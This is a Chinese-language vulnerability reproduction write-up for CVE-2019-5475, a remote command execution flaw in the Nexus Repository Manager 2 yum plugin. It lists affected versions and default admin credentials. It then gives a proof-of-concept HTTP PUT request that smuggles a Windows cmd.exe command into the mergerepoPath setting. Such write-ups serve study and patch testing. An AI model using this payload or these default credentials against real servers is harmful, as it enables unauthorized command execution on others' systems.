---
title: （CVE-2019-5475）Nexus2 yum插件RCE漏洞
id: zhfly3039
---

# （CVE-2019-5475）Nexus2 yum插件RCE漏洞

## 一、漏洞简介

该漏洞默认存在部署权限账号，成功登录后可使用“createrepo”或“mergerepo”自定义配置，可触发远程命令执行漏洞

## 二、漏洞影响

Nexus Repository Manager OSS <= 2.14.13
Nexus Repository Manager Pro <= 2.14.13
限制：admin权限才可触发漏洞

## 三、复现过程

首先以管理员身份（admin/admin123）登录
然后找到漏洞位置：Capabilities - Yum:Configuration - Settings

![image](../img/8590877884662d4d3fc69224fb507594.png)

点击 Save 抓包，更改mergerepoPath后的value值

```
C:\\Windows\\System32\\cmd.exe /k dir& 
```

![image](../img/3e7535f6f94716328aadcec9855c5f75.png)

此处使用 /k 是因为这样命令执行完会保留进程不退出，而 /c 后执行完会退出；由于给用户提供的命令后面加了一个 --version，所以后面要加个&，&表两个命令同时执行，这样就不会干扰其他命令的执行

Poc如下：

```
PUT /nexus/service/siesta/capabilities/00012bdb034073a3 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Nexus-UI: true
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 241
DNT: 1
Connection: close
Referer: http://127.0.0.1:8081/nexus/
Cookie: NXSESSIONID=105c7cb1-a307-43a3-9ff8-9770b5ae3b13 `{“typeId”:“yum”,“enabled”:true,“properties”:[{“key”:“maxNumberParallelThreads”,“value”:“10”},{“key”:“createrepoPath”,“value”:“111”},{“key”:“mergerepoPath”,“value”:“C:\Windows\System32\cmd.exe /k dir&”}],“id”:“00012bdb034073a3”,“notes”:""}` 
```